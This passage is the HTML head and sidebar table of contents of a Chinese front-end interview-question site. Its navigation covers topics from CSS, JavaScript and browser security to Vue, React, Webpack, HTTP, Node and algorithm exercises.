<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>前端进阶之旅</title>
    <meta name="generator" content="VuePress 1.9.7">
    <link rel="icon" href="/FE-Interview-Questions/logo.png">
    <link rel="manifest" href="/FE-Interview-Questions/manifest.json">
    <link rel="apple-touch-icon" href="/FE-Interview-Questions/icons/apple-touch-icon-152x152.png">
    <link rel="mask-icon" href="/FE-Interview-Questions/icons/safari-pinned-tab.svg" color="#3eaf7c">
    <link rel="manifest" href="/FE-Interview-Questions/manifest.json">
    <script>
      var _hmt = _hmt || [];
      (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?0219e9e99d6bcc9481a4d5b9a865853a";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
    <script>
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.ready.then(registration => {
          registration.unregister();
        });
      }
    </script>
    <meta name="description" content="前端面试题进阶总结，按模块分类精心整理，打造最全面的前端面试题库，为你的前端面试之旅保驾护航！">
    <meta name="theme-color" content="#3eaf7c">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="robots" content="all">
    <meta name="author" content="程序员poetry">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="keywords" content="程序员poetry，前端进阶之旅，前端面试之旅, 前端面试指南，前端进阶之旅，前端进阶学习路线,前端笔记整理,前端面试宝典, 前端面经手册，前端系统进阶笔记整理">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="msapplication-TileImage" content="/icons/msapplication-icon-144x144.png">
    <meta name="msapplication-TileColor" content="#000000">
    
    <link rel="preload" href="/FE-Interview-Questions/assets/css/0.styles.546ba69d.css" as="style"><link rel="preload" href="/FE-Interview-Questions/assets/css/styles.css?v=1686313754486" as="style"><link rel="preload" href="/FE-Interview-Questions/assets/js/fe-styles.js?v=1686313754486" as="script"><link rel="preload" href="/FE-Interview-Questions/assets/js/fe-app.js?v=1686313754486" as="script"><link rel="preload" href="/FE-Interview-Questions/assets/js/fe-3.js?v=1686313754486" as="script"><link rel="preload" href="/FE-Interview-Questions/assets/js/fe-5.js?v=1686313754486" as="script"><link rel="preload" href="/FE-Interview-Questions/assets/js/fe-51.js?v=1686313754486" as="script"><link rel="preload" href="/FE-Interview-Questions/assets/js/fe-11.js?v=1686313754486" as="script">
    <link rel="stylesheet" href="/FE-Interview-Questions/assets/css/0.styles.546ba69d.css"><link rel="stylesheet" href="/FE-Interview-Questions/assets/css/styles.css?v=1686313754486">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container posr"><!----> <div><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/FE-Interview-Questions/" class="home-link router-link-active"><img src="/FE-Interview-Questions/logo.png" alt="前端进阶之旅" class="logo"> <span class="site-name can-hide">前端进阶之旅</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <!----> <span class="login-btn"><i class="el-tooltip el-icon-user-solid item">登录</i></span> <!----></div></header></div> <div class="sidebar-mask"></div> <aside class="sidebar"><!---->  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>基础进阶</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/FE-Interview-Questions/docs/base.html" class="sidebar-link">基础篇</a></li><li><a href="/FE-Interview-Questions/docs/base/improve.html" class="sidebar-link">进阶篇</a></li><li><a href="/FE-Interview-Questions/docs/base/high-frequency.html" aria-current="page" class="active sidebar-link">高频篇</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_1-css" class="sidebar-link">1 CSS</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#盒模型" class="sidebar-link">盒模型</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#bfc" class="sidebar-link">BFC</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#选择器权重计算方式" class="sidebar-link">选择器权重计算方式</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#清除浮动" class="sidebar-link">清除浮动</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#垂直居中的方案" class="sidebar-link">垂直居中的方案</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#css3的新特性" class="sidebar-link">CSS3的新特性</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#css动画和过渡" class="sidebar-link">CSS动画和过渡</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#有哪些方式-css-可以隐藏页面元素" class="sidebar-link">有哪些方式（CSS）可以隐藏页面元素</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#说说em-px-rem-vh-vw区别" class="sidebar-link">说说em/px/rem/vh/vw区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#flex布局" class="sidebar-link">flex布局</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如果要做优化-css提高性能的方法有哪些" class="sidebar-link">如果要做优化，CSS提高性能的方法有哪些？</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#画一条-0-5px-的线" class="sidebar-link">画一条 0.5px 的线</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如何画一个三角形" class="sidebar-link">如何画一个三角形</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#两栏布局-左边定宽-右边自适应方案" class="sidebar-link">两栏布局：左边定宽，右边自适应方案</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_2-javascript" class="sidebar-link">2 JavaScript</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#typeof类型判断" class="sidebar-link">typeof类型判断</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#类型转换" class="sidebar-link">类型转换</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#闭包" class="sidebar-link">闭包</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#原型与原型链" class="sidebar-link">原型与原型链</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#原型继承和-class-继承" class="sidebar-link">原型继承和 Class 继承</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#模块化" class="sidebar-link">模块化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#事件机制" class="sidebar-link">事件机制</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#箭头函数" class="sidebar-link">箭头函数</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#js内存泄露如何检测-场景有哪些" class="sidebar-link">JS内存泄露如何检测？场景有哪些？</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#async-await异步总结" class="sidebar-link">async/await异步总结</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#promise异步总结" class="sidebar-link">Promise异步总结</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#event-loop执行机制过程" class="sidebar-link">Event Loop执行机制过程</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_3-浏览器" class="sidebar-link">3 浏览器</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#储存" class="sidebar-link">储存</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#浏览器缓存机制" class="sidebar-link">浏览器缓存机制</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#从输入url-到网页显示的完整过程" class="sidebar-link">从输入URL 到网页显示的完整过程</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#常见的web前端攻击方式有哪些" class="sidebar-link">常见的web前端攻击方式有哪些</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#跨域方案" class="sidebar-link">跨域方案</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#移动端h5点击有300ms延迟-该如何解决" class="sidebar-link">移动端H5点击有300ms延迟，该如何解决</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如何实现网页多标签tab通讯" class="sidebar-link">如何实现网页多标签tab通讯</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#requestidlecallback和requestanimationframe有什么区别" class="sidebar-link">requestIdleCallback和requestAnimationFrame有什么区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#script标签的defer和async有什么区别" class="sidebar-link">script标签的defer和async有什么区别</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_4-vue2" class="sidebar-link">4 Vue2</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#响应式原理" class="sidebar-link">响应式原理</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vdom和diff算法" class="sidebar-link">vdom和diff算法</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#模板编译" class="sidebar-link">模板编译</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue组件渲染过程" class="sidebar-link">Vue组件渲染过程</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue组件之间通信方式有哪些" class="sidebar-link">Vue组件之间通信方式有哪些</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue的生命周期方法有哪些" class="sidebar-link">Vue的生命周期方法有哪些</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如何统一监听vue组件报错" class="sidebar-link">如何统一监听Vue组件报错</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#在实际工作中-你对vue做过哪些优化" class="sidebar-link">在实际工作中，你对Vue做过哪些优化</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_5-vue3" class="sidebar-link">5 Vue3</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue3-对-vue2-有什么优势" class="sidebar-link">vue3 对 vue2 有什么优势</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue3-和-vue2-的生命周期有什么区别" class="sidebar-link">vue3 和 vue2 的生命周期有什么区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如何理解composition-api和options-api" class="sidebar-link">如何理解Composition API和Options API</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#ref如何使用" class="sidebar-link">ref如何使用</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#toref和torefs如何使用和最佳方式" class="sidebar-link">toRef和toRefs如何使用和最佳方式</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#深入理解为什么需要ref、toref、torefs" class="sidebar-link">深入理解为什么需要ref、toRef、toRefs</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue3升级了哪些重要功能" class="sidebar-link">vue3升级了哪些重要功能</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#composition-api-如何实现逻辑复用" class="sidebar-link">Composition API 如何实现逻辑复用</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue3如何实现响应式" class="sidebar-link">Vue3如何实现响应式</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#proxy-基本使用" class="sidebar-link">Proxy 基本使用</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue3用proxy-实现响应式" class="sidebar-link">vue3用Proxy 实现响应式</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#v-model参数的用法" class="sidebar-link">v-model参数的用法</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#watch和watcheffect的区别" class="sidebar-link">watch和watchEffect的区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#setup中如何获取组件实例" class="sidebar-link">setup中如何获取组件实例</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue3为何比vue2快" class="sidebar-link">Vue3为何比Vue2快</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#什么是patchflag" class="sidebar-link">什么是PatchFlag</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#什么是hoiststatic和cachehandler" class="sidebar-link">什么是HoistStatic和CacheHandler</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#ssr和tree-shaking的优化" class="sidebar-link">SSR和Tree-shaking的优化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vite-为什么启动非常快" class="sidebar-link">Vite 为什么启动非常快</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#composition-api-和-react-hooks-的对比" class="sidebar-link">Composition API 和 React Hooks 的对比</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_6-react" class="sidebar-link">6 React</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#jsx本质" class="sidebar-link">JSX本质</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#react合成事件机制" class="sidebar-link">React合成事件机制</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#setstate和batchupdate机制" class="sidebar-link">setState和batchUpdate机制</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#根据jsx写出vnode和render函数" class="sidebar-link">根据jsx写出vnode和render函数</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#虚拟dom-vdom-真的很快吗" class="sidebar-link">虚拟DOM（vdom）真的很快吗</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#react组件渲染过程" class="sidebar-link">react组件渲染过程</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#react-setstate经典面试题" class="sidebar-link">React setState经典面试题</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#react-useeffect闭包陷阱问题" class="sidebar-link">React useEffect闭包陷阱问题</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#vue-react-diff-算法有什么区别" class="sidebar-link">Vue React diff 算法有什么区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如何统一监听react组件报错" class="sidebar-link">如何统一监听React组件报错</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#在实际工作中-你对react做过哪些优化" class="sidebar-link">在实际工作中，你对React做过哪些优化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#react真题" class="sidebar-link">React真题</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_7-react-hooks" class="sidebar-link">7 React Hooks</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#class组件存在哪些问题" class="sidebar-link">class组件存在哪些问题</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#用usestate实现state和setstate功能" class="sidebar-link">用useState实现state和setState功能</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#用useeffect模拟组件生命周期" class="sidebar-link">用useEffect模拟组件生命周期</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#用useeffect模拟willunmount时的注意事项" class="sidebar-link">用useEffect模拟WillUnMount时的注意事项</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#useref和usecontext" class="sidebar-link">useRef和useContext</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#usereducer能代替redux吗" class="sidebar-link">useReducer能代替redux吗</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#使用usememo做性能优化" class="sidebar-link">使用useMemo做性能优化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#使用usecallback做性能优化" class="sidebar-link">使用useCallback做性能优化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#什么是自定义hook" class="sidebar-link">什么是自定义Hook</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#使用hooks的两条重要规则" class="sidebar-link">使用Hooks的两条重要规则</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#为何hooks要依赖于调用顺序" class="sidebar-link">为何Hooks要依赖于调用顺序</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#class组件逻辑复用有哪些问题" class="sidebar-link">class组件逻辑复用有哪些问题</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#hooks组件逻辑复用有哪些好处" class="sidebar-link">Hooks组件逻辑复用有哪些好处</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#hooks使用中的几个注意事项" class="sidebar-link">Hooks使用中的几个注意事项</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_8-webpack" class="sidebar-link">8 Webpack</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#hash、chunkhash、contenthash区别" class="sidebar-link">hash、chunkhash、contenthash区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#webpack常用插件总结" class="sidebar-link">webpack常用插件总结</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#webpack热更新原理" class="sidebar-link">webpack热更新原理</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#webpack原理简述" class="sidebar-link">webpack原理简述</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#webpack性能优化-构建速度" class="sidebar-link">webpack性能优化-构建速度</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#webpack性能优化-产出代码-线上运行" class="sidebar-link">webpack性能优化-产出代码（线上运行）</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_9-http" class="sidebar-link">9 HTTP</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#http基础总结" class="sidebar-link">HTTP基础总结</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#http缓存" class="sidebar-link">HTTP缓存</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#http协议1-0和1-1和2-0有什么区别" class="sidebar-link">HTTP协议1.0和1.1和2.0有什么区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#websocket和http协议有什么区别" class="sidebar-link">WebSocket和HTTP协议有什么区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#请描述tcp三次握手和四次挥手" class="sidebar-link">请描述TCP三次握手和四次挥手</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#http跨域请求时为什么要发送options请求" class="sidebar-link">HTTP跨域请求时为什么要发送options请求</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#http请求中token、cookie、session有什么区别" class="sidebar-link">HTTP请求中token、cookie、session有什么区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#什么是https中间人攻击-如何预防-https加密过程、原理" class="sidebar-link">什么是HTTPS中间人攻击，如何预防（HTTPS加密过程、原理）</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_10-node" class="sidebar-link">10 Node</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#浏览器和nodejs事件循环-event-loop-有什么区别" class="sidebar-link">浏览器和nodejs事件循环（Event Loop）有什么区别</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#nodejs如何开启多进程-进程如何通讯" class="sidebar-link">nodejs如何开启多进程，进程如何通讯</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_11-综合题目" class="sidebar-link">11 综合题目</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#你们的工作流程是怎么样的" class="sidebar-link">你们的工作流程是怎么样的</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#工作中遇到过哪些项目难点-是如何解决的" class="sidebar-link">工作中遇到过哪些项目难点，是如何解决的</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#前端性能优化" class="sidebar-link">前端性能优化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#前端常用的设计模式和使用场景" class="sidebar-link">前端常用的设计模式和使用场景</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如果一个h5很慢-如何排查性能问题" class="sidebar-link">如果一个H5很慢，如何排查性能问题</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#后端一次性返回十万条数据-你该如何渲染" class="sidebar-link">后端一次性返回十万条数据，你该如何渲染</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#h5页面如何进行首屏优化" class="sidebar-link">H5页面如何进行首屏优化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#请描述js-bridge的实现原理" class="sidebar-link">请描述js-bridge的实现原理</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#从零搭建开发环境需要考虑什么" class="sidebar-link">从零搭建开发环境需要考虑什么</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#如果你是项目前端技术负责人-将如何做技术选型" class="sidebar-link">如果你是项目前端技术负责人，将如何做技术选型</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#高效的字符串前缀匹配如何做" class="sidebar-link">高效的字符串前缀匹配如何做</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#前端路由原理" class="sidebar-link">前端路由原理</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_12-手写题" class="sidebar-link">12 手写题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#防抖" class="sidebar-link">防抖</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#节流" class="sidebar-link">节流</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#new的过程" class="sidebar-link">New的过程</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#instanceof原理" class="sidebar-link">instanceOf原理</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现call方法" class="sidebar-link">实现call方法</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现apply方法" class="sidebar-link">实现apply方法</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现bind方法" class="sidebar-link">实现bind方法</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#发布订阅模式" class="sidebar-link">发布订阅模式</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写js深拷贝-考虑各种数据类型和循环引用" class="sidebar-link">手写JS深拷贝-考虑各种数据类型和循环引用</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#用js实现一个lru缓存" class="sidebar-link">用JS实现一个LRU缓存</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写curry函数-实现函数柯里化" class="sidebar-link">手写curry函数，实现函数柯里化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写一个lazyman-实现sleep机制" class="sidebar-link">手写一个LazyMan，实现sleep机制</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写一个gettype函数-获取详细的数据类型" class="sidebar-link">手写一个getType函数，获取详细的数据类型</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写一个js函数-实现数组扁平化array-flatten" class="sidebar-link">手写一个JS函数，实现数组扁平化Array Flatten</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#把一个数组转换为树" class="sidebar-link">把一个数组转换为树</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#获取当前页面url参数" class="sidebar-link">获取当前页面URL参数</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写promise加载一张图片" class="sidebar-link">手写Promise加载一张图片</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#两个数组求交集和并集" class="sidebar-link">两个数组求交集和并集</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#js反转字符串" class="sidebar-link">JS反转字符串</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#设计实现一个h5图片懒加载" class="sidebar-link">设计实现一个H5图片懒加载</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#手写vue3基本响应式原理" class="sidebar-link">手写Vue3基本响应式原理</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现一个简洁版的promise" class="sidebar-link">实现一个简洁版的promise</a></li></ul></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#_13-算法题" class="sidebar-link">13 算法题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#时间复杂度与空间复杂度基本概念" class="sidebar-link">时间复杂度与空间复杂度基本概念</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现数字千分位格式化" class="sidebar-link">实现数字千分位格式化</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#实现快速排序并说明时间复杂度" class="sidebar-link">实现快速排序并说明时间复杂度</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#将数组中的0移动到末尾" class="sidebar-link">将数组中的0移动到末尾</a></li><li class="sidebar-sub-header"><a href="/FE-Interview-Questions/docs/base/high-frequency.html#求斐波那契数列的第n值" class="sidebar-link">求斐波那契数列的第n值</a></li><li class="sidebar-sub-header"><a 